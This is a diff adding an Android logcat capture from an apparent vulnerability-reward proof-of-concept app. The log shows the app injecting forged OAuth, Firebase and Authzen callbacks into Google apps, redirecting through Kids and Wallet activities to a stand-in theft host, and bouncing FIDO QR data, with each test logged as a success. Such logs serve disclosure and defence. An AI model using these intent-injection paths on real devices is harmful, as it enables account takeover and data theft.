@@ -1,0 +1,1175 @@
+--------- beginning of main
+09-04 07:18:26.090 23504 23504 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:input tap 540 1091'
+09-04 07:18:26.146 16366 16366 D VRP_POC : === RUNNING ALL TESTS ===
+09-04 07:18:26.148 16366 16366 D VRP_POC : [TEST 1] Gmail CSE OAuth Callback Injection
+09-04 07:18:26.150  1431  2256 W AS.PlaybackActivityMon: No piid assigned for invalid/internal port id 33
+09-04 07:18:26.150  1431  6903 V GrammaticalInflectionUtils: AttributionSource: android.content.AttributionSource@1364511b does not have READ_SYSTEM_GRAMMATICAL_GENDER permission.
+09-04 07:18:26.150  1431  1464 W AS.PlaybackActivityMon: No piid assigned for invalid/internal port id 33
+09-04 07:18:26.150   926  1744 W audio_hw_35l41: cs35l41_amp_common_event: ret: 0, event: 15, state: 2, device: 0
+09-04 07:18:26.151   926  1744 D audio_hw_output_stream: update stream 1 active 1 gain 0.036208
+09-04 07:18:26.151   926  3525 D audio_hw: prepare low-latency-playback
+09-04 07:18:26.151   926  3525 D audio_hw_soundtrigger: st_uc_monitor:uc:low-latency-playback active
+09-04 07:18:26.151   926  3525 D audio_hw: low-latency-playback:
+09-04 07:18:26.151   926  3525 D audio_hw: rx:
+09-04 07:18:26.151   926  3525 D audio_hw:   #0: OUT_SPEAKER_BE_CFG 0
+09-04 07:18:26.151   926  3525 W audio_hw_35l41: cs35l41_amp_common_event: ret: 0, event: 1, state: 2, device: 4
+09-04 07:18:26.151   926  3525 D audio_route: Apply path: speaker
+09-04 07:18:26.151   926  3525 D audio_hw_aoc_route: speaker 1
+09-04 07:18:26.151   926  3525 D audio_route: Apply path: hostless-ulC spk-vi
+09-04 07:18:26.153   926  3525 W audio_hw_35l41: cs35l41_amp_common_event: ret: 0, event: 2, state: 3, device: 4
+09-04 07:18:26.153   926  3525 D audio_hw_soundtrigger: st_comm_aud_event_monitor:codec dev:4 active
+09-04 07:18:26.153   926  3525 I audio_hw_aoc: Mode Ambient is already selected
+09-04 07:18:26.153   926  3525 D audio_route: Apply path: low-latency-playbackP
+09-04 07:18:26.154  1178  1178 D AOC     : F1:MSG: controller.cc, 273: AudioOutCtrl: cmd ID: 0x010f, tag: 0x98 [cntr = 463]
+09-04 07:18:26.154  1178  1178 D AOC     : F1:Source 1 mastered by sink 0
+09-04 07:18:26.154  1178  1178 D AOC     : F1:AT Map:2 (LL:0), 1 EPs active, Power: Yes, Config: No
+09-04 07:18:26.154  1178  1178 D AOC     : F1:Mixer 0 configuration changed: (2)
+09-04 07:18:26.154  1178  1178 D AOC     : F1:Sink 0 Configuration changed: ULL (enabled)
+09-04 07:18:26.154  1178  1178 D AOC     : F1:AHWSinkSPKR started: 48 samples (32-bit,2 ch,48 kHz) block 384
+09-04 07:18:26.154  1178  1178 D AOC     : F1:[AHWSinkSPKR] DL resync B: 0, A:0. wo: 0, target offset: 1632 (align 0) -> ro:0
+09-04 07:18:26.154  1178  1178 D AOC     : F1:MSG: controller.cc, 811: AudioOutCtrl: ipc: audio_output_co, cmd ID: 0x010f, tag: 0x98, rc: 0
+09-04 07:18:26.155  1178  1178 D AOC     : F1:Speaker Started (DualDMA on 1 and 2)
+09-04 07:18:26.155  1178  1178 D AOC     : F1:[AHWSinkSPKR] mix overrun by 3840
+09-04 07:18:26.155  1178  1178 D AOC     : H0:Mixer AMixSPKR: 480 samples (0002/0002) (ON SC)
+09-04 07:18:26.155  1178  1178 D AOC     : H0:	 1: 0x403e1ac0
+09-04 07:18:26.155  1178  1178 D AOC     : H0:AMixSPKR PostProcessing Config: WAVES
+09-04 07:18:26.155  1178  1178 D AOC     : H0:Mixer configuration updated
+09-04 07:18:26.155  1178  1178 D AOC     : H0:Mixer state changed
+09-04 07:18:26.155   926  3525 D audio_hw_aoc_route: low-latency-playbackP 1
+09-04 07:18:26.155   926  3525 E audio_route: unable to find path 'speaker-post'
+09-04 07:18:26.155   926  3525 D audio_hw_aoc_route: speaker-post 1
+09-04 07:18:26.159   545  1550 I libbinder.BpBinder: onLastStrongRef automatically unlinking death recipients for binder (0xb40000787be7ede0) with descriptor: '(not cached)'
+--------- beginning of system
+09-04 07:18:26.159  1431  6903 V ActivityTaskManager: TaskLaunchParamsModifier: phase=3 task=Task{927dffb #58 type=standard A=10355:com.vrp.poc} activity=ActivityRecord{97860364 u0 com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseRedirectUriReceiverActivity t-1} display-area-from-source=DefaultTaskDisplayArea@42689679 display-id=0 task-display-area-windowing-mode=1 suggested-display-area=DefaultTaskDisplayArea@42689679 inherit-from-source=fullscreen non-freeform-task-display-area display-area=DefaultTaskDisplayArea@42689679 default-portrait freeform-size-mismatch=Rect(276, 694 - 804, 1774)
+09-04 07:18:26.159  1431  6903 I ActivityTaskManager: START u0 {act=android.intent.action.VIEW dat=https://client-side-encryption.google.com/... xflg=0x4 cmp=com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseRedirectUriReceiverActivity} with LAUNCH_MULTIPLE from uid 10355 (com.vrp.poc) (sr=171011466) (BAL_ALLOW_VISIBLE_WINDOW) result code=0
+09-04 07:18:26.160 16366 16366 D VRP_POC : SUCCESS: CSE callback injected from UID 10355
+09-04 07:18:26.160  2052  2074 V WindowManagerShell: Transition requested (#207): android.os.BinderProxy@9eee684 TransitionRequestInfo { type = OPEN, triggerTask = TaskInfo{userId=0 taskId=58 effectiveUid=10355 displayId=0 isRunning=true baseIntent=Intent { flg=0x10000000 cmp=com.vrp.poc/.MainActivity } baseActivity=ComponentInfo{com.vrp.poc/com.vrp.poc.MainActivity} topActivity=ComponentInfo{com.google.android.gm/com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseRedirectUriReceiverActivity} origActivity=null realActivity=ComponentInfo{com.vrp.poc/com.vrp.poc.MainActivity} realActivityIsAppLockEnabled=false numActivities=2 lastActiveTime=26601143 supportsMultiWindow=true supportsMultiWindowWithoutConstraints=true resizeMode=1 isResizeable=true minWidth=-1 minHeight=-1 defaultMinSize=220 token=WCT{android.os.BinderProxy@eb9b0f8} topActivityType=1 pictureInPictureParams=null shouldDockBigOverlays=false launchIntoPipHostTaskId=-1 lastParentTaskIdBeforePip=-1 displayCutoutSafeInsets=Rect(0, 0 - 0, 0) topActivityInfo=ActivityInfo{30c8e6d com.google.apps.security.cse.xplat.identity.oidc.appauth.android.CseRedirectUriReceiverActivity} launchCookies=[] positionInParent=Point(0, 0) parentTaskId=-1 isFocused=true isInteractive=true isVisible=true isVisibleRequested=true isTopActivityNoDisplay=false isSleeping=false locusId=null displayAreaFeatureId=1 isTopActivityTransparent=false isActivityStackTransparent=false lastNonFullscreenBounds=Rect(276, 694 - 804, 1774) leafTaskBoundsFromOptions= false capturedLink=https://client-side-encryption.google.com/oidc/gmail/native/callback?code=4/ATTACKER_AUTH_CODE&state=INJECTED_STATE capturedLinkTimestamp=0 requestedVisibleTypes=503 topActivityRequestOpenInBrowserEducationTimestamp=0 appCompatTaskInfo=AppCompatTaskInfo { topActivityInSizeCompat=false isLeafTask= true eligibleForLetterboxEducation= false isLetterboxEducationEnabled= false isLetterboxDoubleTapEnabled= false eligibleForUserAspectRatioButton= false topActivityBoundsLetterboxed= false isFromLetterboxDoubleTap= false topActivityLetterboxVerticalPosition= -1 topActivityLetterboxHorizontalPosition= -1 topActivityLetterboxWidth=-1 topActivityLetterboxHeight=-1 topActivityAppBounds=Rect(0, 0 - 1080, 2400) isUserFullscreenOverrideEnabled=false isSystemFullscreenOverrideEnabled=false hasMinAspectRatioOverride=false topActivityLetterboxBounds=null topNonResizableActivityAspectRatio=-1.0} topActivityMainWindowFrame=null isAppBubble=false}, pipChange = null, remoteTransitionInfo = null, displayChanges = null, requestedLocation = null, userChange = null, windowingLayerChange = null, fullscreenRequestChange = null, flags = 0, debugId = 207 }
+09-04 07:18:26.160  2052  2074 W DisconnectHandler: No disconnect change found in the transition, not handling request.
+09-04 07:18:26.160  2052  2074 D ShellSplitScreen: logExit: no-op, mLoggerSessionId is null
+09-04 07:18:26.160 16366 16366 D VRP_POC : [TEST 2] GMS Firebase Auth Callback Injection
+09-04 07:18:26.163   926  3525 D audio_hw_waves: waves_usecase_event: low-latency-playback start
+09-04 07:18:26.163   926  3525 D audio_hw_waves: waves_usecase_event: trigger to update tuning when first track is running.
+09-04 07:18:26.163  1178  1178 D AOC     : F1:MSG: controller.cc, 273: AudioOutCtrl: cmd ID: 0x00ce, tag: 0x99 [cntr = 464]
+09-04 07:18:26.163   926  3525 D audio_hw_waves: update_sink_info_from_usecases: sink 1 VOL/Stream update 0.000000(4294967295) -> 0.036208(1)
+09-04 07:18:26.163  1178  1178 D AOC     : F1:MSG: controller.cc, 811: AudioOutCtrl: ipc: audio_output_co, cmd ID: 0x0120, tag: 0x04, rc: 0
+09-04 07:18:26.163  1431  6903 W TransitionChain: Combining startAct into #207(OPEN|R|0x0) from startAct
+09-04 07:18:26.163   926  3525 D audio_hw_waves: send_waves_tuning: instance_id = 1, tuning_id = 2
+09-04 07:18:26.163   926  3525 D audio_hw_aoc: aoc_send_rtc_mixer_tuning: block_id = 16, comp_id = 2
+09-04 07:18:26.164  1178  1178 D AOC     : F1:MSG: controller.cc, 273: AudioOutCtrl: cmd ID: 0x00d5, tag: 0x49 [cntr = 465]
+09-04 07:18:26.165  1431  6903 V ActivityTaskManager: TaskLaunchParamsModifier: phase=3 task=Task{927dffb #58 type=standard A=10355:com.vrp.poc} activity=ActivityRecord{203488248 u0 com.google.android.gms/com.google.firebase.auth.api.gms.ui.BrowserSignInResponseHandlerActivity t-1} display-area-from-source=DefaultTaskDisplayArea@42689679 display-id=0 task-display-area-windowing-mode=1 suggested-display-area=DefaultTaskDisplayArea@42689679 inherit-from-source=fullscreen non-freeform-task-display-area display-area=DefaultTaskDisplayArea@42689679 default-portrait freeform-size-mismatch=Rect(276, 694 - 804, 1774)
+09-04 07:18:26.165  1431  6903 I ActivityTaskManager: START u0 {act=android.intent.action.VIEW cat=[android.intent.category.BROWSABLE] dat=https://fir-auth-gms.firebaseapp.com/... xflg=0x4 cmp=com.google.android.gms/com.google.firebase.auth.api.gms.ui.BrowserSignInResponseHandlerActivity} with LAUNCH_MULTIPLE from uid 10355 (com.vrp.poc) (sr=171011466) (BAL_ALLOW_VISIBLE_WINDOW) result code=0
+09-04 07:18:26.165 16366 16366 D VRP_POC : SUCCESS: Firebase Auth callback injected from UID 10355
+09-04 07:18:26.165  1178  1178 D AOC     : H0:MSG: controller.cc, 811: AudOutCtrlH0: ipc: C-AO-H0, cmd ID: 0x00d5, tag: 0x58, rc: 0
+09-04 07:18:26.166 16366 16366 D VRP_POC : [TEST 3] GMS Authzen Challenge Injection
+09-04 07:18:26.166  1178  1178 D AOC     : F1:MSG: controller.cc, 811: AudioOutCtrl: ipc: audio_output_tu, cmd ID: 0x00d5, tag: 0x58, rc: 0
+09-04 07:18:26.167  1431  6903 W TransitionChain: Combining startAct into #207(OPEN|R|0x0) from startAct
+09-04 07:18:26.169  1431  6903 V ActivityTaskManager: TaskLaunchParamsModifier: phase=3 task=Task{927dffb #58 type=standard A=10355:com.vrp.poc} activity=ActivityRecord{123494669 u0 com.google.android.gms/.auth.authzen.AuthzenDeeplinkHandlerActivity t-1} display-area-from-source=DefaultTaskDisplayArea@42689679 display-id=0 task-display-area-windowing-mode=1 suggested-display-area=DefaultTaskDisplayArea@42689679 inherit-from-source=fullscreen non-freeform-task-display-area display-area=DefaultTaskDisplayArea@42689679 default-portrait freeform-size-mismatch=Rect(276, 694 - 804, 1774)
+09-04 07:18:26.169  1431  6903 I ActivityTaskManager: START u0 {act=android.intent.action.VIEW dat=google.authzen://approve/... xflg=0x4 cmp=com.google.android.gms/.auth.authzen.AuthzenDeeplinkHandlerActivity} with LAUNCH_MULTIPLE from uid 10355 (com.vrp.poc) (sr=171011466) (BAL_ALLOW_VISIBLE_WINDOW) result code=0
+09-04 07:18:26.169 16366 16366 D VRP_POC : SUCCESS: Authzen challenge injected from UID 10355
+09-04 07:18:26.169 16366 16366 D VRP_POC : [TEST 4] GMS Kids AllSettingsActivityBad URL redirect
+09-04 07:18:26.170  1178  1178 D AOC     : F1:MSG: controller.cc, 273: AudioOutCtrl: cmd ID: 0x00c9, tag: 0x9a [cntr = 466]
+09-04 07:18:26.170  1178  1178 D AOC     : F1:MSG: controller.cc, 811: AudioOutCtrl: ipc: audio_output_co, cmd ID: 0x00c9, tag: 0x9a, rc: 0
+09-04 07:18:26.171  1431  6903 W TransitionChain: Combining startAct into #207(OPEN|R|0x0) from startAct
+09-04 07:18:26.172  1431  6903 V ActivityTaskManager: TaskLaunchParamsModifier: phase=3 task=Task{927dffb #58 type=standard A=10355:com.vrp.poc} activity=ActivityRecord{66781449 u0 com.google.android.gms/.kids.AllSettingsActivityBad t-1} display-area-from-source=DefaultTaskDisplayArea@42689679 display-id=0 task-display-area-windowing-mode=1 suggested-display-area=DefaultTaskDisplayArea@42689679 inherit-from-source=fullscreen non-freeform-task-display-area display-area=DefaultTaskDisplayArea@42689679 default-portrait freeform-size-mismatch=Rect(276, 694 - 804, 1774)
+09-04 07:18:26.172  1431  6903 I ActivityTaskManager: START u0 {dat=https://vrp-steal.example.com/... xflg=0x5 cmp=com.google.android.gms/.kids.AllSettingsActivityBad} with LAUNCH_MULTIPLE from uid 10355 (com.vrp.poc) (sr=171011466) (BAL_ALLOW_VISIBLE_WINDOW) result code=0
+09-04 07:18:26.172 16366 16366 D VRP_POC : SUCCESS: Kids URL redirect launched
+09-04 07:18:26.172 16366 16366 D VRP_POC : [TEST 5] GMS Wallet Redirect Proxy
+09-04 07:18:26.173  1431  6903 W TransitionChain: Combining startAct into #207(OPEN|R|0x0) from startAct
+09-04 07:18:26.175  1431  6903 V ActivityTaskManager: TaskLaunchParamsModifier: phase=3 task=Task{927dffb #58 type=standard A=10355:com.vrp.poc} activity=ActivityRecord{63546565 u0 com.google.android.gms/.wallet.redirect.FinishAndroidAppRedirectProxyActivity t-1} display-area-from-source=DefaultTaskDisplayArea@42689679 display-id=0 task-display-area-windowing-mode=1 suggested-display-area=DefaultTaskDisplayArea@42689679 inherit-from-source=fullscreen non-freeform-task-display-area display-area=DefaultTaskDisplayArea@42689679 default-portrait freeform-size-mismatch=Rect(276, 694 - 804, 1774)
+09-04 07:18:26.175  1431  6903 I ActivityTaskManager: START u0 {dat=https://vrp-steal.example.com/... xflg=0x5 cmp=com.google.android.gms/.wallet.redirect.FinishAndroidAppRedirectProxyActivity} with LAUNCH_MULTIPLE from uid 10355 (com.vrp.poc) (sr=171011466) (BAL_ALLOW_VISIBLE_WINDOW) result code=0
+09-04 07:18:26.175 16366 16366 D VRP_POC : SUCCESS: Wallet redirect launched
+09-04 07:18:26.175 16366 16366 D VRP_POC : [TEST 6] GMS Kids Content URI Redirect
+09-04 07:18:26.178  1431  6903 W TransitionChain: Combining startAct into #207(OPEN|R|0x0) from startAct
+09-04 07:18:26.180  1431  6903 V ActivityTaskManager: TaskLaunchParamsModifier: phase=3 task=Task{927dffb #58 type=standard A=10355:com.vrp.poc} activity=ActivityRecord{35964993 u0 com.google.android.gms/.kids.AllSettingsActivityBad t-1} display-area-from-source=DefaultTaskDisplayArea@42689679 display-id=0 task-display-area-windowing-mode=1 suggested-display-area=DefaultTaskDisplayArea@42689679 inherit-from-source=fullscreen non-freeform-task-display-area display-area=DefaultTaskDisplayArea@42689679 default-portrait freeform-size-mismatch=Rect(276, 694 - 804, 1774)
+09-04 07:18:26.180  1431  6903 I ActivityTaskManager: START u0 {dat=content://com.google.android.gms.phenotype/... flg=0x1 xflg=0x5 cmp=com.google.android.gms/.kids.AllSettingsActivityBad} with LAUNCH_MULTIPLE from uid 10355 (com.vrp.poc) (sr=171011466) (BAL_ALLOW_VISIBLE_WINDOW) result code=0
+09-04 07:18:26.180 16366 16366 D VRP_POC : SUCCESS: Content URI redirect launched
+09-04 07:18:26.180 16366 16366 D VRP_POC : [TEST 7] AGSA AppIndexing Intent Redirect
+09-04 07:18:26.181  1431  6903 V GrammaticalInflectionUtils: AttributionSource: android.content.AttributionSource@c17bb34b does not have READ_SYSTEM_GRAMMATICAL_GENDER permission.
+09-04 07:18:26.181  1431  6903 W TransitionChain: Combining startAct into #207(OPEN|R|0x0) from startAct
+09-04 07:18:26.183  1431  6903 V ActivityTaskManager: TaskLaunchParamsModifier: phase=3 task=Task{927dffb #58 type=standard A=10355:com.vrp.poc} activity=ActivityRecord{162834301 u0 com.google.android.googlequicksearchbox/com.google.android.search.calypso.AppIndexingActivity t-1} display-area-from-source=DefaultTaskDisplayArea@42689679 display-id=0 task-display-area-windowing-mode=1 suggested-display-area=DefaultTaskDisplayArea@42689679 inherit-from-source=fullscreen non-freeform-task-display-area display-area=DefaultTaskDisplayArea@42689679 default-portrait freeform-size-mismatch=Rect(276, 694 - 804, 1774)
+09-04 07:18:26.183  1431  6903 I ActivityTaskManager: START u0 {act=android.intent.action.VIEW dat=android-app://com.android.settings/... xflg=0x4 cmp=com.google.android.googlequicksearchbox/com.google.android.search.calypso.AppIndexingActivity} with LAUNCH_SINGLE_TOP from uid 10355 (com.vrp.poc) (sr=171011466) (BAL_ALLOW_VISIBLE_WINDOW) result code=0
+09-04 07:18:26.183 16366 16366 D VRP_POC : SUCCESS: AGSA redirect launched
+09-04 07:18:26.183 16366 16366 D VRP_POC : [TEST 8] GMS FIDO QR Bounce
+09-04 07:18:26.185  1431  6903 W TransitionChain: Combining startAct into #207(OPEN|R|0x0) from startAct
+09-04 07:18:26.186 14762 14762 D RecentsView: onTaskDisplayChanged: 59, new displayId = 0
+09-04 07:18:26.187  1431  6903 V ActivityTaskManager: TaskLaunchParamsModifier: phase=3 task=Task{16ea7be #59 type=standard I=com.google.android.gms/.fido.authenticator.ui.QRBounceActivity} activity=ActivityRecord{225001081 u0 com.google.android.gms/.fido.authenticator.ui.QRBounceActivity t-1} display-area-from-source=DefaultTaskDisplayArea@42689679 display-id=0 task-display-area-windowing-mode=1 suggested-display-area=DefaultTaskDisplayArea@42689679 inherit-from-source=fullscreen non-freeform-task-display-area display-area=DefaultTaskDisplayArea@42689679 default-portrait freeform-size-mismatch=Rect(276, 694 - 804, 1774)
+09-04 07:18:26.187  1431  6903 I ActivityTaskManager: START u0 {act=android.intent.action.VIEW dat=FIDO://2/... xflg=0x4 cmp=com.google.android.gms/.fido.authenticator.ui.QRBounceActivity} with LAUNCH_SINGLE_TASK from uid 10355 (com.vrp.poc) (sr=171011466) (BAL_ALLOW_VISIBLE_WINDOW) result code=0
+09-04 07:18:26.187  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.188 16366 16366 D VRP_POC : SUCCESS: FIDO QR bounce launched
+09-04 07:18:26.188 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.188 16366 16366 D VRP_POC : === ALL TESTS COMPLETE ===
+09-04 07:18:26.190  1431  4218 D CorePackageUpdate: Couldn't find a persistent state for task= 59
+09-04 07:18:26.191  1431  4218 D ActivityManager: quick sync unfreeze 15172 for 1
+09-04 07:18:26.192  1431  4218 D CorePackageUpdate: Couldn't find a persistent state for task= 58
+09-04 07:18:26.192  1431  1489 D ActivityManager: sync unfroze 15172 com.google.android.gms.ui for 1
+09-04 07:18:26.192  1431  4218 D ActivityManager: quick sync unfreeze 11126 for 1
+09-04 07:18:26.193  1729  1729 I pixel-thermal: VIRTUAL-SKIN:33.5097 raw data: VIRTUAL-SKIN:33509.6 
+09-04 07:18:26.193  1729  1729 I pixel-thermal: neutral_therm:32.863 raw data: neutral_therm:32863 
+09-04 07:18:26.193  1729  1729 I pixel-thermal: cellular-emergency:33.5097 raw data: VIRTUAL-SKIN:33509.6 cellular-emergency:33509.6 
+09-04 07:18:26.193  1729  1729 I pixel-thermal: usb_pwr_therm2:32.64 raw data: usb_pwr_therm2:32640 
+09-04 07:18:26.193  1729  1729 I pixel-thermal: VIRTUAL-USB-UI:0 raw data: USB2-MINUS-CHG:-2137 VIRTUAL-USB-UI:0 charger_skin_therm:34777 usb_pwr_therm2:32640 
+09-04 07:18:26.193  1431  1489 D ActivityManager: sync unfroze 11126 com.google.android.googlequicksearchbox:search for 1
+09-04 07:18:26.193  1431  4218 D CorePackageUpdate: Couldn't find a persistent state for task= 58
+09-04 07:18:26.194  1431  4218 D CorePackageUpdate: Couldn't find a persistent state for task= 58
+09-04 07:18:26.200  1431  2003 I MR2ServiceImpl: Updating composite discovery preference | preference: RouteDiscoveryRequest{ preferredFeatures={}, activeScan=false }, active routers: []
+09-04 07:18:26.200  1729  1729 I pixel-thermal: VIRTUAL-SKIN:33.5097 raw data: VIRTUAL-SKIN:33509.6 
+09-04 07:18:26.210 11126 11126 I drcp    : Checking for device compliance...
+09-04 07:18:26.214 11126 11180 I drcp    : (REDACTED) Device Compliance Fetch time taken = %sms
+09-04 07:18:26.214 11126 11180 I drcp    : Device is compliant!
+09-04 07:18:26.214 11126 11180 I drcp    : Invoking "compliant" action...
+09-04 07:18:26.216 15172 15172 W Fido    : [QRBounceChimeraActivity] Invalid data from scanning QR Code: FIDO://2?EY_ATTACKER_CBOR_DATA [CONTEXT service_id=287 ]
+09-04 07:18:26.217  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.217 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.220  1431  6903 V ActivityTaskManager: TaskLaunchParamsModifier: phase=3 task=Task{927dffb #58 type=standard A=10355:com.vrp.poc} activity=ActivityRecord{177161137 u0 com.android.vending/com.google.android.finsky.activities.MarketDeepLinkHandlerActivity t-1} display-area-from-source=DefaultTaskDisplayArea@42689679 display-id=0 task-display-area-windowing-mode=1 suggested-display-area=DefaultTaskDisplayArea@42689679 inherit-from-source=fullscreen non-freeform-task-display-area display-area=DefaultTaskDisplayArea@42689679 default-portrait freeform-size-mismatch=Rect(276, 694 - 804, 1774)
+09-04 07:18:26.220  1431  6903 I ActivityTaskManager: START u0 {act=android.intent.action.VIEW dat=market://details/... xflg=0x4 pkg=com.android.vending cmp=com.android.vending/com.google.android.finsky.activities.MarketDeepLinkHandlerActivity (has extras)} with LAUNCH_MULTIPLE from uid 10173 (com.google.android.googlequicksearchbox) (sr=162834301) (BAL_ALLOW_VISIBLE_WINDOW) result code=0
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: Error binding root VE for QRBounceActivity [CONTEXT service_id=264 ]
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: java.lang.IllegalStateException: You need to use a Theme.AppCompat theme (or descendant) with this activity.
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at mb.R(:com.google.android.gms@263268035@26.32.68 (260400-975269223):667)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at mb.f(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at acto.findViewById(:com.google.android.gms@263268035@26.32.68 (260400-975269223):5)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at acnx.public_findViewById(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at acny.findViewById(:com.google.android.gms@263268035@26.32.68 (260400-975269223):5)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at bfzi.onCreate(:com.google.android.gms@263268035@26.32.68 (260400-975269223):221)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.app.Activity.performCreate(Activity.java:9340)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.app.Activity.performCreate(Activity.java:9318)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1543)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:4559)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:4781)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:224)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.app.servertransaction.TransactionExecutor.executeNonLifecycleItem(TransactionExecutor.java:133)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.app.servertransaction.TransactionExecutor.executeTransactionItems(TransactionExecutor.java:103)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:80)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.app.ActivityThread$H.handleMessage(ActivityThread.java:3032)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.os.Handler.dispatchMessageImpl(Handler.java:142)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.os.Handler.dispatchMessage(Handler.java:125)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.os.Looper.loopOnce(Looper.java:296)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.os.Looper.loop(Looper.java:397)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at android.app.ActivityThread.main(ActivityThread.java:9523)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at java.lang.reflect.Method.invoke(Native Method)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:575)
+09-04 07:18:26.225 15172 15172 W GmsActivityProxy: 	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:939)
+09-04 07:18:26.227 15172 15172 W ChimeraProxyRslvr: No registered Chimera impl for com.google.android.gms.kids.SettingsActivity
+09-04 07:18:26.228 15172 15172 E AbstractGmsTracer: Traced class shouldn't be obfuscated: achg [CONTEXT service_id=259 ]
+09-04 07:18:26.229 15172 15172 W ChimeraUtils: Unexpected module id prefix: 
+09-04 07:18:26.229 15172 15172 W ChimeraUtils: Empty module id ignored
+09-04 07:18:26.230 15172 15172 W GmsActivityProxy: Error binding root VE. SettingsActivity is missing a @GmsCoreVeId annotation. [CONTEXT service_id=264 ]
+09-04 07:18:26.231 15172 15172 I ContentCaptureHelper: Setting logging level to OFF
+09-04 07:18:26.244 14762 14762 D RecentsView: onTaskDisplayChanged: 60, new displayId = 0
+09-04 07:18:26.246  2052  2074 V RecentTasksController: Notify recent tasks changed
+09-04 07:18:26.246 14762 14762 D RecentTasksList: invalidateLoadedTasks - previous requestLoadId: -1
+09-04 07:18:26.246  1431  6903 V ActivityTaskManager: TaskLaunchParamsModifier: phase=3 task=Task{6951ab3 #60 type=standard A=10266:com.google.android.gms} activity=ActivityRecord{170426402 u0 com.google.android.gms/.wallet.redirect.StartAndroidAppRedirectProxyActivity t-1} display-area-from-source=DefaultTaskDisplayArea@42689679 display-id=0 task-display-area-windowing-mode=1 suggested-display-area=DefaultTaskDisplayArea@42689679 inherit-from-source=fullscreen non-freeform-task-display-area display-area=DefaultTaskDisplayArea@42689679 default-portrait freeform-size-mismatch=Rect(276, 694 - 804, 1774)
+09-04 07:18:26.247  1431  6903 I ActivityTaskManager: START u0 {act=com.google.android.wallet.redirect.intent.action.FINISH_REDIRECT dat=https://vrp-steal.example.com/... flg=0x4000000 xflg=0x4 cmp=com.google.android.gms/.wallet.redirect.StartAndroidAppRedirectProxyActivity} with LAUNCH_SINGLE_INSTANCE from uid 10266 (com.google.android.gms) (sr=63546565) (BAL_ALLOW_VISIBLE_WINDOW) result code=0
+09-04 07:18:26.249 15172 15172 W GmsActivityProxy: Error binding root VE. FinishAndroidAppRedirectProxyActivity is missing a @GmsCoreVeId annotation. [CONTEXT service_id=264 ]
+09-04 07:18:26.251 15172 15172 E .android.gms.ui: hiddenapi: Accessing hidden method Lcom/android/internal/widget/ActionBarOverlayLayout;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;)V (runtime_flags=0, domain=platform, api=max-target-r) from Lacii; (domain=app, TargetSdkVersion=37) using reflection: denied
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: Error attempting to create  view
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: android.view.InflateException: Binary XML file line #21: Error inflating class com.android.internal.widget.ActionBarOverlayLayout
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acii.a(:com.google.android.gms@263268035@26.32.68 (260400-975269223):180)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acar.platform_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):20)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acnx.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):3)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at com.google.android.chimera.android.Activity.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acnx.public_onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):1)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at acny.onCreateView(:com.google.android.gms@263268035@26.32.68 (260400-975269223):5)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.tryCreateView(LayoutInflater.java:958)
+09-04 07:18:26.252 15172 15172 W ChimeraViewCreator: 	at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:886)
